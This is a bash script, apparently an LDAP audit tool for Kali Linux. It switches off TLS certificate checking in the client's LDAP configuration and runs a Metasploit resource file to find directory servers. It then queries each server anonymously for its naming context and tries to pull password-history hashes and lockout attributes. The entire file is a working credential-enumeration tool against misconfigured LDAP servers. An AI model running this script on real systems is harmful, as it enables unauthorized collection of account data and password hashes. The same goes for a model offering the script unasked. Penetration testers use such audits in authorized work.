#!/bin/bash



# You can't make LDAPS connctions unless your client is configured propery. Kali isn't by default.
if grep -q "TLS_REQCERT ALLOW" /etc/ldap/ldap.conf
then
		echo "LDAPS Configured on your client. Continuing..."
	else
		echo "LDAPS Not Configured. Configuring Now..."
		echo "TLS_REQCERT ALLOW" >> /etc/ldap/ldap.conf
fi

rm ldap_*
msfconsole -r ldapaudit.rc


for q in {389,636,3268,3269}
do
echo "Starting servers with port: $q"
perl -ni -e 'print unless $. == 1' ldap_$q
for i in `cat ldap_$q`;
do
	ip=`echo $i | cut -d"," -f 1 | sed -e 's/\"//g'`
	if [[ $q == 389 ]] || [[ $q == 3268 ]]
	then
		prefix="ldap://"
	else
		prefix="ldaps://"
	fi
	echo "Prefix=$prefix$ip:$q"
	a=`ldapsearch -H $prefix$ip:$q -x -b '' -s base '(objectclass=*)' | grep defaultNamingContext` 

	b=`echo $a | cut -d " " -f 2`

	#Enumeration String
	echo $ip ":" $b

	DC1=`echo $b | cut -d"," -f 1`
	#echo "DC1 = $DC1"
	DC2=`echo $b | cut -d "," -f 2`
	#echo "DC2 = $DC2"
	DC3=`echo $b | cut -d "," -f 3`
	#echo "DC3 = $DC3"

	#Try Extracting Historical Passowrd Hashes

	result=`ldapsearch -H $prefix$ip:$q -x -b $DC1,$DC2,$DC3 "(cn=*)" "(objectclass=*)" pwdchangedtime pwdaccountlockedtime pwdexpirationwarned pwdfailuretime pwdhistory pwdgraceusetime pwdreset`
	test1=0
	
	if [[ $result == *"Invalid DN syntax"* ]]
	then
	test1=1
	f=`ldapsearch -H $prefix$ip:$q -x -s base \* + | grep namingContexts`
	g=`echo $f | cut -d " " -f 2`
	DC1=`echo $g | cut -d"," -f 1`
	DC2=`echo $g | cut -d"," -f 2`
	DC3=`echo $g | cut -d"," -f 3`
	echo "New DC= $ip $DC1,$DC2,$DC3"
	result=`ldapsearch -H $prefix$ip:$q -x -b $DC1,$DC2,$DC3 "(cn=*)" "(objectclass=*)" pwdchangedtime pwdaccountlockedtime pwdexpirationwarned pwdfailuretime pwdhistory pwdgraceusetime pwdreset`
	fi
	if [[ $result == *"Operations error"* ]] || [[ $result == *"Not bind/authenticate"* ]]
	then
		echo "Failed to aquire account information"
	else
		echo $result
		echo "For cleaner data results run:"
		echo "ldapsearch -H $prefix$ip:$q -x -b $DC1,$DC2,$DC3 \"(cn=*)\" \"(objectclass=*)\" pwdchangedtime pwdaccountlockedtime pwdexpirationwarned pwdfailuretime pwdhistory pwdgraceusetime pwdreset"
	fi
done

done
